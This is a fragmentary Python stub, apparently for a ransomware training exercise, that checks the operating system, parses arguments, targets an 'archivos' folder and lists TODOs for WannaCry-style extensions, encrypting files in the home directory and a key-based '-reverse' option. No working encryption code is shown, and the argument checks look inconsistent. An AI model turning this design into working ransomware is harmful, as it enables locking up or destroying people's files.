	...
	if system() == "Linux" or system() == "Darwin":
		if len(argv) > 2:
			...
			if len(argv) == 2 and (argv[1] == "-help" or argv[1] == "-h"):
				...
				path_to_encrypt = os.getcwd() + '/archivos'
...
'''TODO: Wannacry extensions'''
'''TODO: Solo puede funcionar en el directorio HOME'''
'''TODO: The program will have the option "-reverse" or "-r" followed by the key entered as
an argument to reverse the infection.'''
'''TODO: The program will show each encrypted file during the process unless the option is 
